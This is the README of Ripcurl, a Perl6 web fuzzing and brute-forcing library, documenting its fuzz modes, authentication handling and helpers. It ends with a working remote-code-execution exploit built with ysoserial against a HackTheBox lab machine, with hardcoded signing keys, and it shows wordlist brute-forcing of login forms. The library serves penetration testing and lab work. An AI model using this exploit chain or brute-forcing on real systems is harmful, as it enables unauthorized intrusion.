# Description
:ocean:
Ripcurl is a Perl6 library for rapidly enumerating, fuzzing/injecting, and brute-forcing web servers/applications when you need to get your hands dirty. Some of it's features include:

1. Interactive injection with Readline support (searchable history, keybindings, & custom functions)
2. Fuzz with strings from a file, your keyboard, an external program, a range (a-z, 0-9, etc), or an array.
3. Injection of URLs, headers, forms, JSON, etc
4. Supports Basic, Bearer, Digest, NTLM, and Negotiate(NYI) authentication schemes
5. Can initialize itself with a saved request from burpsuite or zaproxy
6. Utility functions for URL encoding, JSON conversions, base64 encoding, etc

##### A quick example:
Given some JSON API at example.com, the following code would grab an auth token and drop you into a readline prompt ready to fuzz `someAttribute` at `/api/endpoint/tofuzz`.

```
use Ripcurl;
$rc = RC.new('https://example.com/api/endpoint/tofuzz', username=>'luser', password=>'password1', auth=>BASIC);
$rc.get('/api/auth/login');
my %resp = str2json($rc.content);
$rc.set-header( X-Example-Token => %resp<token> );
$rc.fuzz(FUZZPOST, hash2json( %(id =>123, name=>'somename', someAttribute=>'IFUZZ') ), :ajax);
```
If you are a fan of one-liners, this would give you the same result:
```
perl6 -M Ripcurl -e 'RC.new("https://example.com/api/endpoint/tofuzz", username=>"luser",  password=>"password1").get("/api/auth/login").set-header(X-Example-Token=>str2json($rc.content)<token>).fuzz(FUZZPOST,hash2json( %(id =>123, name=>"somename",somefield=>"IFUZZ")),:ajax)'
```

Short-lived sessions, time-based OTPs, and other hassles are easy to handle without adding much complexity, provided you can write a few lines of [perl6](https://docs.perl6.org).

##### General notes:
* Ripcurl uses libcurl via the perl6 module [Libcurl::Easy](https://github.com/CurtTilmes/perl6-libcurl). It's high quality and has good documentation. Read it if you need it.
* Libcurl itself has a ton of options. Read about them [here](https://curl.haxx.se/libcurl/c/curl_easy_setopt.html). These are available through `setopt`.
* It does not support anything multipart-mime related. This is on the list.
* All references to AJAX really mean "AJAX if it uses JSON." XML support is also on the list.
* Most class methods that don't explicitly return something will return `self` to allow for method chaining and nastier one-liners.
* Fuzz/inject are used interchangeably in this document to add some variety. The lib doesn't care what you're doing.

##### TODO:
* XML support
* MIME support
* Add a script for running the readline fuzzer from the commandline
* Cleanup README
* Write POD

# Class RC

Ripcurl exports one class, `RC`.

### Fields

##### Str $.target

The request target. Get it with `$rc.target`. Set it with `$rc.target('/new/target.php')`. Setting a new value updates libcurl's [CURLOPT_REQUEST_TARGET](https://curl.haxx.se/libcurl/c/CURLOPT_REQUEST_TARGET.html)

##### Str %.hdr

A `Hash` of headers. Call `set-header()` and `delete-header()` to modify it.

##### LibCurl::Easy $.curl

The libcurl handle. Feel free to call methods on it, but I'd appreciate a bug report if you need to do so. You'll have to keep its state in sync with ripcurl's. You must [rtfm](https://github.com/CurtTilmes/perl6-libcurl) to do this safely.

### Methods

##### method new(Str $url, ... )

> $rc = RC.new('http://example.com/some/target')

The first argument must be the URL. The following named parameters are available:

* auth - the authentication scheme to use (explained later)

* username

* password

* token - OAuth 2.0 Bearer Access Token string

* insecure - disables all ssl verification. Toggle it when the server uses a self-signed certificate.

* postfields - Sets contents of the POST body. It's used to set [CURLOPT_POSTFIELDS](https://curl.haxx.se/libcurl/c/CURLOPT_POSTFIELDS.html)

* proxy - the proxy to use, scheme included. e.g. `http://127.0.0.1:8080`


You can also set headers by passing a hash in `:hdr`.
> RC.new('http://example.com/', hdr=> %(Host => "dev.example.com") )

##### method fuzz( FUZZMODE $mode, Str $fuzzstr, :$source, Bool :$ajax, :&print, :&mutate, :&custom)

###### $mode

Takes a `FUZZMODE` enum value.

|Enum value | Description |
|---|---|
|FUZZURL| Use it for fuzzing query parameters. It's intended for use with GET requests, which libcurl makes by default. However, this is not enforced, and ripcurl will make whatever request it is configured to make. If you really wanted to brute URLs with OPTIONS requests, you could do it with this. |
|FUZZPOST| Sends POSTs. Use it for www-form-urlencoded forms and AJAX calls |
|FUZZMIME | NYI |
|FUZZHEADER| Fuzzes a single header using whatever type of request ripcurl is configured to make. |

###### $fuzzstr and :$source
Using wildcards, `$fuzzstr` and `$source` determine the source of your wordlist and the injection location. The available wildcards are IFUZZ, FILE, PROG, RANGE, and ARRAY.
`$fuzzstr` should contain the entire string for whatever part of the request you're fuzzing.

* When `$mode` is FUZZPOST, `$fuzzstr` must contain the entire POST body.
> `{"action":"auth","username":"luser","password":"FILE"}` or `action=auth&username=luser&password=FILE`

* When `$mode` is FUZZURL, `$fuzzstr` must contain the entire request target.
> `/?param1=aaa&param2=FILE&param3=ccc`

* When `$mode` is FUZZHEADER, `$fuzzstr` must contain the header as it would appear in the request.
> `Host: FILE` or `FILE: whywouldyoudothis`

What you pass in `:$source` depends on the wildcard used in $fuzzstr. `$source` is type-checked based on the wildcard used.

| Wildcard | Behavior | :$source
| --- | ---|---|
| IFUZZ | Readline prompt. Sending a blank line terminates the loop. | N/A. unused and ignored |
| FILE | Reads from a wordlist | A string containing the path to your wordlist |
| PROG | Uses output from an external command. `$source` gets passed straight to the shell, and the lines of output are used as a wordlist. The exit code is ignored and no error checking takes place. | A string containing a cmdline to shell out |
| RANGE | Uses a perl6 `Range` | A perl6 `Range` |
| ARRAY | Uses a perl6 `Array` | A perl6 `Array` |

###### :$ajax

Set to `True` to assign appropriate values to the `X-Requested-With` and `Content-Type` headers.

###### &print

A `Callable` type (sub, block, method, etc) that takes no parameters and prints output. Use this to print output after each request. If left undefined, the body of each response is printed in full. There are some helper methods available to print basic info (they all start with 'p-'), though you can define your own. If you only want to print output under a certain condition, you have to write it yourself.

Helpers:
* p-statcode()
* p-statline()
* p-etag()
* p-resphdrs()

Since these are called on an `RC` instance, you have to wrap them like this: `&{$rc.p-statcode}`.

To print the status line from each response:
> $rc.fuzz(FUZZPOST, $fuzzstr, :$source, :print( &{$rc.p-statline} ) );

To print 'Success' for 200 response codes only:
> $rc.fuzz(FUZZPOST, $fuzzstr, :$source, :print( { say 'Success' if $rc.response-code == 200 } ) );

###### &mutate

A `Callable` type (sub, block, method, etc) that must take and return a `Str`. If defined, this is called with the current injection string, and the return value is used in the request.

> $rc.fuzz(FUZZPOST, $fuzzstr, :$source, :mutate(&uenc) ); #would urlencode the fuzz word

You can do much more than URL encoding here. There is an example at the end which builds a java deserialization payload using the string as the injected cmdline.

###### :&custom

A `Callable` type (sub, block, method, etc) that will be called between requests. If in some rare, unfortunate circumstance you need this, read the source for the `fuzz()` method, specifically the `&doit` block and the section dealing with wildcards.

tldr: Just forget about this option. It's user-hostile. However, the example at the end shows it in use.

### method target()

Returns the current request target

### method target(Str $new)

Sets a new request target and updates [CURLOPT_REQUEST_TARGET](https://curl.haxx.se/libcurl/c/CURLOPT_REQUEST_TARGET.html)

### method get()

Send a GET request with the current ripcurl state, meaning the target will be `$.target`.

### method get(Str $temptarget, Bool :$append)

Send a GET request to `$temptarget`, where `$temptarget` is a new request target. If `$append` is set, `$temptarget` is appended to `RC.target` instead. Either way, this doesn't modify the `RC.target` attribute, so you can use it without affecting subsequent requests.

### method head()

Send a HEAD request. This method sets `nobody` to True, which tells libcurl not to download the body of the response. If you call this and want to make a GET request later, you will have to manually reset `nobody` with `$rc.setopt(:nobody=>False)`.

### method head(Str $temptarget, Bool :$append)

`$temptarget` and `$append` work as they do with `get`.

### method post(:%fields, Str :$body, Bool :$ajax)

Issues a POST using the current ripcurl state. If `%fields` is passed, the KV pairs are added to the post body in www-form-url-encoded fashion, but no encoding is done for you. If `$body` is passed, it is copied straight into the post body as is. Setting `:$ajax` to `True` will set the appropriate header values for an AJAX call.

### method post(Str $temptarget,:%fields, Str :$body, Bool :$ajax, Bool :$append)

`$temptarget` and `$append` work as they do with `get`.

### method grab-cookie()

Returns the value of a Set-Cookie header after calling `get()`;

### method grab-cookie(Str $temptarget, :$append --> Str)

`$temptarget` and `$append` work as they do with `get`.

### method options(Str $query='*', Bool :$append)

Send an OPTIONS request. The default target is '\*', so it can be called with no parameters. `:$append` works as above.

### method set-auth(Str $authtype=ANY, :$token, :$username, :$password)

##### $authtype

Takes an `AUTHMODE` enum value. The available options are: BASIC, BEARER, DIGEST, NTLM, NEGOTIATE, and ANY. The default value is `ANY`, making this parameter completely optional. See the [libcurl documentation](https://curl.haxx.se/libcurl/c/CURLOPT_HTTPAUTH.html) if you need it.

##### :$token
##### :$username
##### :$password

###### Examples:

`$rc.set-auth(BASIC, username=>'luser', password=>'password1');`

`$rc.set-auth(username=>'luser', password=>'password1');`

`$rc.set-auth(BEARER, token=>'atokenstring');`

## Wrapper methods

### method perform()

Sends the request.

### method content()

Returns the body of the response as a `Str`.

### method buf()

Returns the body of the response as a `Buf`.

### method receiveheaders()

Returns a `Hash` of the response headers.

### method get-header(Str $hdr --> Str)

Returns a `Str` containing the value of the response header `$hdr`.

### method setopt(*%opts)

Sets [libcurl options](https://curl.haxx.se/libcurl/c/curl_easy_setopt.html). This is a wrapper of LibCurl::Easy's setopt(), so we must play by [it's rules](https://github.com/CurtTilmes/perl6-libcurl#options).

### method set-header(%header)

Add the key-value pairs in `%header` to ripcurl's headers. Overwrites any existing headers.

### method set-header(Pair $p)

Set a single header. Overwrites an existing value.

### method delete-header(Str $header)

Deletes the header named in `$header`.

### method delete-header()

Deletes *ALL* headers

### method bind-keyseq(Str $name, Str $keyseq, &func)

Readline wrapper. It binds a key-sequence to `&func`. This is only applicable when injecting manually. The `$name` doesn't matter, but readline requires it.
> $rc.bind-keyseq('login', '\C-R', &relog); # would bind Ctrl-Shift-r to &relog

You might use this to refresh an auth token or start a new session without leaving the readline prompt.

## Utility functions

These are exported subs not class methods.

#### uenc(Str $s)

Returns a string containing the URL encoded version of `$s`. This will percent encode every non-alphanumeric character, reserved or not, so calling it on the full target string probably won't do what you want.

#### uenc2(Str $s)

Returns a double URL encoded `$s`.

#### file2json(Str $path --> Hash)

Takes a string containing the path to a file with JSON content. Returns a `Hash` of the JSON object.

#### str2json(Str $s --> Hash)

Takes a string containing a JSON object and returns a `Hash` of the object.

#### hash2json(%obj --> Str)

Takes a `Hash` and returns a JSON string.

#### roll-email(Str :$dom --> Str)

Generates a random email address with random username and domain from 8-12 characters each. The TLD is picked at random from a short list. You can specify a domain by setting `:$dom`.

#### rc-from-file(Str $path, *%opts)

Uses a request saved by burpsuite or zaproxy to construct an `RC` object. This function isn't completely thorough and won't work in many non-trivial cases. However, for typical GET/POST requests, it's expected to work.

It will configure Basic and Bearer authentication for you if the `Authorization` header exists. Other auth schemes must be configured manually.

The author recommends testing it with an intercepting proxy for anything but basic GET/POST operations before use. The source for this function is well commented, so you can look to see if it handles what you need.

The slurpy parameter `*%opts` is for any libcurl [options](https://github.com/CurtTilmes/perl6-libcurl#options) you want to set explicitly. To test with an intercepting proxy:

> rc-from-file('request.txt', proxy=>'http://127.0.0.1:8080');

# How to do things

### Load a request from a file

```
perl6 -M Ripcurl -e 'my $rc = rc-from-file('request.txt');'
```
### Fuzz a URL parameter with a wordlist, printing the status-line from each response

```
perl6 -M Ripcurl -e my $rc='RC.new("https://example.com");$rc.fuzz(FUZZURL,"/?param1=1&param2=FILE&param3=whatever",:source("/root/wordlists/raft-small-words.txt"),:print(&{$rc.p-statline}) )'
```

### Build payloads with &mutate and update other fields with &custom

This example is from a retired hackthebox machine. It's gnarly, but it shows everything that Ripcurl and `fuzz()` can do. Give it a command to execute at the readline prompt, and it will build a deserialization payload for Java Server Faces, POST it, and print the status code.


```perl6
use Ripcurl;

#the form fields. The ViewState is set to IFUZZ because I want the readline prompt.
my %fuzz = 'javax.faces.ViewState'=>'IFUZZ',
           'j_id_jsp_1623871077_1%3Aemail' => roll-email(),
           'j_id_jsp_1623871077_1%3Asubmit'=>'SIGN+UP',
           'j_id_jsp_1623871077_1_SUBMIT'=>'1';

#builds the payload & returns it encrypted, signed, and encoded
sub genpayload($cmd) {
    qqx|/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -jar /root/cloned/ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 cmd "$cmd" > /tmp/pload1| ;

    #encrypt and sign it with openssl
    qx|openssl enc -des-ecb -K 4a7346393837362d -in /tmp/pload1 -out /tmp/pload2|;
    my $mac = qx|openssl sha1 -hmac "JsF9876-" /tmp/pload2|;

    #put it together
    my @bytes = $mac.chomp.split(' ').tail.comb(2);
    my buf8 $buff = '/tmp/pload2'.IO.slurp(:bin);
    $buff.append(@bytes>>.parse-base(16));
    my $payload = base64-enc($buff)
                  .decode('utf8-c8')
                  .trans(['+'] => ['%2B'],['/']=>['%2F'],['=']=>['%3D']);
    return $payload;
}
#updates the email addr after each request. Note the new wildcard
sub updatefields() {
   %fuzz{'javax.faces.ViewState'} ='FUZZ';
   %fuzz{'j_id_jsp_1623871077_1%3Aemail'} = roll-email();
   return hash2fields(%fuzz);
}

#instantiate RC, grab a session cookie, and start running commands
my $rc = RC.new('http://10.10.10.130:8080/userSubscribe.faces');
$rc.set-header('Cookie' => $rc.grab-cookie.split(';').head);
my $fuzzstr = hash2fields(%fuzz);
$rc.fuzz(FUZZPOST,$fuzzstr, :mutate(&genpayload), :custom(&updatefields), :print(&{$rc.p-statcode}));
```
